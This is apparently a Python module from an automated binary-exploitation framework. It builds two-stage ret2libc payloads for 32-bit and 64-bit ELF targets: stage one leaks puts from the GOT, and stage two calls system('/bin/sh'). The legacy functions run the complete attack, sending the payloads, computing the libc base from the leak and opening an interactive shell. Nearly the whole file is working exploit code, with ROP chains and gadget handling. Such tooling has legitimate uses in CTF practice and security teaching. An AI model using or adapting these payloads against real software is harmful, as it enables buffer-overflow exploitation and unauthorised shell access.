"""AutoPwn primitives layer: 2-stage ret2libc-put payload builders (P6.3).

Replaces the v3.1 monolith's ``ret2libc_put_x32`` /
``ret2libc_put_x64`` (local) + ``ret2libc_put_x32_canary_*`` /
``ret2libc_put_x64_canary_*`` (canary — P7.10) payload
construction blocks (see ``autopwn/_legacy.py`` L1706-1868 +
L2229-2420 area) with two typed :class:`ExploitPrimitive`
subclasses that **override ``stage_count()`` to 2**.

Per ``rebuild.md`` §6.7 P6.3 + ``refactor.md`` §3.2.2, this is
the **first 2-stage primitive** in the P6 layer (M3 milestone).
It demonstrates the canonical 2-stage pattern: stage 1 leaks
a libc address via ``puts(puts@GOT)``, stage 2 returns to
``system('/bin/sh')`` using the leaked address.

Public API
----------
* :class:`Ret2LibcPutX32` — 32-bit 2-stage primitive.
  * ``build_payload(ctx)`` → stage 1 leak payload
    (``padding + puts_plt + main_addr + puts_got``)
  * ``build_stage2_payload(ctx, leaked_puts_addr)`` → stage 2
    final payload (``padding + system_addr + 0 + sh_addr``)
  * ``stage_count()`` → 2
* :class:`Ret2LibcPutX64` — 64-bit 2-stage primitive.  Same
  API contract; stage 1 uses ``pop_rdi + puts_got + puts_plt +
  main`` gadget chain, stage 2 includes the ``ret`` alignment
  gadget (P6.2 §64-bit alignment fix).

Why two methods instead of one
------------------------------
The P6.1 abstract contract defines ``build_payload(ctx) -> bytes``
as a single return.  For 2-stage exploits, the strategy needs
**both** stage payloads, and the second stage depends on data
received at runtime (the leaked address).  We satisfy the
P6.1 contract by making ``build_payload(ctx)`` return stage 1
(the leak), and exposing ``build_stage2_payload(ctx, leak)``
as an additional public method that the strategy calls after
receiving the leak.  ``stage_count()`` → 2 signals to the P7
orchestrator that it should call both.

P7 usage pattern::

    payload1 = prim.build_payload(ctx)            # stage 1
    io.sendline(payload1)
    leak = u32(io.recv(4))                         # parse leak
    payload2 = prim.build_stage2_payload(ctx, leak)  # stage 2
    io.sendline(payload2)

Legacy ports (parity only)
--------------------------
* :func:`_legacy_ret2libc_put_x32` — verbatim port of v3.1's
  ``ret2libc_put_x32`` (L1706-1772).  Preserves the full
  v3.1 flow: ``io.recv()`` + ``io.sendline`` + ``io.recvuntil``
  + ``u32(...)`` + LibcSearcher / ELF symbol arithmetic +
  ``io.sendline`` + ``handle_exploitation_success`` +
  ``io.interactive()``.
* :func:`_legacy_ret2libc_put_x64` — verbatim port of v3.1's
  ``ret2libc_put_x64`` (L1773-1868).  Same flow with
  ``u64`` for 64-bit leak parsing and ``flat([...])`` for
  the gadget-chain payload.

Design notes
------------
* Stage 1 reads ``e.plt['puts']`` / ``e.got['puts']`` /
  ``e.symbols['main']`` from the binary (no libc needed).
* Stage 2 reads ``ctx.libc.elf`` (pwntools ``ELF`` instance)
  or lazily opens ``ctx.libc.path`` if ``elf`` is ``None``.
  The strategy should populate ``ctx.libc`` (P4.2 already does
  this) before invoking stage 2.
* LibcSearcher fallback (``libc == 1``) is preserved in the
  legacy port only — the new public function assumes
  ``ctx.libc.elf`` is set (per P4.2 design).
* Stage 2 for x64 includes the ``ret`` alignment gadget
  (P6.2 design) to fix Ubuntu 18.04+ glibc MOVAPS crash.
"""
from __future__ import annotations

from pathlib import Path
from typing import Optional, Tuple

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


def _lookup_puts_and_main(program: Path) -> Tuple[Optional[int], Optional[int], Optional[int]]:
    """Look up ``puts@plt``, ``puts@got``, and ``main`` from the binary.

    Returns:
        ``(puts_plt, puts_got, main_addr)`` — any may be ``None``
        when the symbol / GOT entry is absent.  The primitive
        treats ``None`` as "not applicable" and returns ``b""``.

    Side effects:
        Read-only ELF open via pwntools.  No writes, no globals
        writes, no process spawns.
    """
    from pwn import ELF

    try:
        e = ELF(str(program), checksec=False)
    except Exception:
        return None, None, None
    try:
        puts_plt = e.plt["puts"]
    except (KeyError, AttributeError):
        puts_plt = None
    try:
        puts_got = e.got["puts"]
    except (KeyError, AttributeError):
        puts_got = None
    try:
        main_addr = e.symbols["main"]
    except (KeyError, AttributeError):
        main_addr = None
    return puts_plt, puts_got, main_addr


def _resolve_libc_elf(ctx: ExploitContext):
    """Return the pwntools ``ELF`` for ``ctx.libc`` (lazy-open if needed).

    Returns ``None`` when ``ctx.libc.path`` is unset and
    ``ctx.libc.elf`` is also ``None``.  Mirrors P4.2's
    lazy-resolve pattern.
    """
    if ctx.libc.elf is not None:
        return ctx.libc.elf
    if ctx.libc.path is None:
        return None
    from pwn import ELF
    return ELF(str(ctx.libc.path), checksec=False)


class Ret2LibcPutX32(ExploitPrimitive):
    """32-bit 2-stage ``ret2libc`` payload builder (leak via ``puts``).

    Stage 1 (leak) payload shape::

        [A * ctx.padding] [p32(puts_plt)] [p32(main_addr)] [p32(puts_got)]

    Stage 2 (return-to-system) payload shape::

        [A * ctx.padding] [p32(system_addr)] [p32(0)] [p32(sh_addr)]

    Requires:
        * ``ctx.binary.path`` is a 32-bit ELF with ``puts@plt``,
          ``puts@got``, and ``main`` symbols.
        * ``ctx.padding`` is the offset to the saved return
          address (P5.1).
        * ``ctx.libc.elf`` or ``ctx.libc.path`` is set (P4.2)
          before stage 2.
    """

    name = "ret2libc-put-x32"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``puts(puts@GOT)``)."""
        from pwn import asm, p32

        puts_plt, puts_got, main_addr = _lookup_puts_and_main(ctx.binary.path)
        if puts_plt is None or puts_got is None or main_addr is None:
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(puts_plt)
            + p32(main_addr)  # return to main() for stage 2
            + p32(puts_got)   # argument: address of puts@got
        )

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_puts_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Args:
            ctx: the run's :class:`ExploitContext`.  Reads
                ``ctx.binary.path`` and ``ctx.libc.elf`` (or
                ``ctx.libc.path``).
            leaked_puts_addr: the runtime address of ``puts``
                in libc, parsed from the stage-1 response.

        Returns:
            The stage-2 payload bytes, or ``b""`` when libc
            resolution fails.
        """
        from pwn import asm, p32

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_puts = libc.symbols["puts"]
            libc_base = leaked_puts_addr - libc_puts
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        return (
            asm("nop") * ctx.padding
            + p32(system_addr)
            + p32(0)
            + p32(sh_addr)
        )


class Ret2LibcPutX64(ExploitPrimitive):
    """64-bit 2-stage ``ret2libc`` payload builder (leak via ``puts``).

    Stage 1 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(puts_got)] [p64(puts_plt)] [p64(main_addr)]

    Stage 2 payload shape::

        [A * padding] [p64(pop_rdi)] [p64(sh_addr)] [p64(ret)] [p64(system_addr)]

    Requires:
        * Same as :class:`Ret2LibcPutX32`, but 64-bit.
        * ``ctx.gadgets_x64.pop_rdi`` and ``ctx.gadgets_x64.ret``
          are non-zero (P4.4).

    The extra ``ret`` gadget between ``sh_addr`` and
    ``system_addr`` fixes the 16-byte RSP alignment required
    by Ubuntu 18.04+ glibc (P6.2 §64-bit alignment).
    """

    name = "ret2libc-put-x64"

    def stage_count(self) -> int:
        return 2

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Build the stage-1 leak payload (``puts(puts@GOT)``)."""
        from pwn import asm, flat, p64

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0:
            return b""

        puts_plt, puts_got, main_addr = _lookup_puts_and_main(ctx.binary.path)
        if puts_plt is None or puts_got is None or main_addr is None:
            return b""

        return flat(
            asm("nop") * ctx.padding
            + p64(ctx.gadgets_x64.pop_rdi)
            + p64(puts_got)
            + p64(puts_plt)
            + p64(main_addr)
        )

    def build_stage2_payload(
        self, ctx: ExploitContext, leaked_puts_addr: int,
    ) -> bytes:
        """Build the stage-2 final payload (``system('/bin/sh')``).

        Mirrors v3.1 ``_legacy.ret2libc_put_x64`` L2010-2017 2-variant
        cascade (P6.3b fix, B-007 defensive): when ``extra_rdi=1``
        (``pop rdi; pop <reg>; ret``), v3.1 inserts a 0 placeholder
        between ``sh`` and ``ret`` to consume the extra slot.  P8.4
        §2.6 baseline does not exercise this path (no Challenge/
        binary hits ret2libc_put-x64), but the contract layer must
        match v3.1 to prevent future binary regressions.
        """
        from pwn import asm, flat, p64

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0 or ctx.gadgets_x64.ret == 0:
            return b""

        libc = _resolve_libc_elf(ctx)
        if libc is None:
            return b""

        try:
            libc_puts = libc.symbols["puts"]
            libc_base = leaked_puts_addr - libc_puts
            system_addr = libc_base + libc.symbols["system"]
            sh_addr = libc_base + next(libc.search(b"/bin/sh"))
        except (KeyError, AttributeError, StopIteration):
            return b""

        g = ctx.gadgets_x64
        if g.extra_rdi == 1:
            # v3.1 L2010-2017: extra_rdi=1 → 0 placeholder between sh and ret
            return flat(
                asm("nop") * ctx.padding
                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
                + p64(g.ret)  # stack-alignment gadget
                + p64(system_addr)
            )
        # extra_rdi=0: 4-p64 chain (P6.3 default)
        return flat(
            asm("nop") * ctx.padding
            + p64(g.pop_rdi) + p64(sh_addr)
            + p64(g.ret)  # stack-alignment gadget
            + p64(system_addr)
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's full IO flow
# =====================================================================

def _legacy_ret2libc_put_x32(program, libc, padding, libc_path) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcPutX32`] Verbatim port of v3.1's ``ret2libc_put_x32``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3239).
    Preserves the full v3.1 IO flow: ``io = process(program)`` +
    ``ELF(program)`` + ``ELF(libc)`` (or ``LibcSearcher``) +
    payload1 send + ``io.recvuntil(b'\\xf7')`` leak parse +
    libc arithmetic + payload2 send + ``handle_exploitation_success``
    + ``io.interactive()``.

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, p32, process, u32, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (puts) - x32")
    print_payload("preparing ret2libc exploit using puts function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    puts_plt = e.symbols["puts"]
    puts_got = e.got["puts"]

    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"puts@plt: {Colors.YELLOW}{hex(puts_plt)}{Colors.END}")
    print_info(f"puts@got: {Colors.YELLOW}{hex(puts_got)}{Colors.END}")

    payload1 = asm("nop") * padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)
    io.recv()
    io.sendline(payload1)

    try:
        puts_addr = u32(io.recvuntil(b"\xf7")[-4:])
    except Exception:
        return False
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc_searcher.dump("puts")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_puts = libc.symbols["puts"]
        system_addr = puts_addr - libc_puts + libc.symbols["system"]
        sh_addr = puts_addr - libc_puts + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    payload2 = asm("nop") * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


def _legacy_ret2libc_put_x64(
    program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr,
    other_rdi_registers, other_rsi_registers, libc_path,
) -> bool:
    """[OBSOLETE — prefer :class:`Ret2LibcPutX64`] Verbatim port of v3.1's ``ret2libc_put_x64``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3251).
    Preserves the v3.1 IO flow including ``other_rdi_registers``
    conditional payload shape.
    """
    from pwn import ELF, asm, flat, p64, process, u64, LibcSearcher

    from autopwn.core.logging import (
        Colors, print_section_header, print_payload, print_info,
        print_success, print_critical,
    )

    print_section_header("EXPLOITATION: ret2libc (puts) - x64")
    print_payload("preparing ret2libc exploit using puts function")

    io = process(str(program))
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)

    e = ELF(str(program))
    main_addr = e.symbols["main"]
    puts_plt = e.symbols["puts"]
    puts_got = e.got["puts"]

    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rdi_addr = p64(pop_rdi_addr)

    payload1 = flat(
        [asm("nop") * padding, pop_rdi_addr, p64(puts_got),
         p64(puts_plt), p64(main_addr)]
    )
    io.recv()
    io.sendline(payload1)

    try:
        puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    except Exception:
        return False
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")

    if libc == 1 or not hasattr(libc, "symbols"):
        libc_searcher = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc_searcher.dump("puts")
        system_addr = libcbase + libc_searcher.dump("system")
        sh_addr = libcbase + libc_searcher.dump("str_bin_sh")
    else:
        libc_puts = libc.symbols["puts"]
        system_addr = puts_addr - libc_puts + libc.symbols["system"]
        sh_addr = puts_addr - libc_puts + next(libc.search(b"/bin/sh"))

    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")

    io.recv()
    ret_addr = p64(int(ret_addr, 16))

    if other_rdi_registers == 1:
        payload2 = flat(
            [asm("nop") * padding, pop_rdi_addr, p64(sh_addr),
             p64(0), ret_addr, p64(system_addr), p64(0)]
        )
    else:
        payload2 = flat(
            [asm("nop") * padding, pop_rdi_addr, p64(sh_addr),
             ret_addr, p64(system_addr)]
        )

    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()
    return True


__all__ = [
    "Ret2LibcPutX32",
    "Ret2LibcPutX64",
    "_legacy_ret2libc_put_x32",
    "_legacy_ret2libc_put_x64",
]
